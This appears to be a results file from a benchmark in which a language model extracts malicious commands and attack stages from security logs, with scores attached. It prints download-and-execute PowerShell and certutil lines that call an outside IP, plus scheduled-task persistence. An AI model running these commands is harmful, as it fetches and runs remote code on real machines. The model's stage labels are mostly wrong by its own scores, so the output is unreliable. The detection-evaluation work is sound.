@@ -1,0 +1,159 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Webrequest http://124.223.85.207:8082/a\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Collection"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /c \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"schtasks /delete /tn test /f\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\\\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\4iwlyhn4\\4iwlyhn4.cmdline\\\" ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1547.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebResponseRequest http://124.223.85.207:8082/T1218.005.hta -Method 'GET' -UseBasicParsing -ContentType \"text/html\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Webrequest http://124.223.85.207:8082/a\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\yajshw1q\\yajshw1q.cmdline\\\" ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "csc.exe /noconfig /fullpaths @\\\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\yajshw1q\\yajshw1q.cmdline\\\" ",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "taskhostw.exe System",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The initial access vector appears to be through PowerShell scripts downloaded from an unknown location. The attackers attempt to execute them as elevated commands using various methods such as invoking web requests to download files via downloads, creating new processes, decoding certificate URLs, executing batch scripts directly via `cmd.exe`, or bypassing script restrictions using unsigned assemblies. Once executed, these scripts may install additional tools or service management components to facilitate further operations like privilege escalation (`taskhostw.exe`), defense evasion, discovery, collection, and lateral movement.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 178846,
+      "completion_tokens": 8075,
+      "total_tokens": 186921,
+      "wall_clock_s": 81.76,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.2962962962962963,
+      "recall": 0.42105263157894735,
+      "f1": 0.34782608695652173,
+      "tp": 8,
+      "fp": 19,
+      "fn": 11
+    },
+    "stage": {
+      "precision": 0.037037037037037035,
+      "recall": 0.07142857142857142,
+      "f1": 0.04878048780487805,
+      "tp": 1,
+      "fp": 26,
+      "fn": 13,
+      "recall_partial": 0.14285714285714285
+    },
+    "hallucination_rate": 0.14285714285714285,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 178846,
+      "completion_tokens": 8075,
+      "total_tokens": 186921,
+      "wall_clock_s": 81.76,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
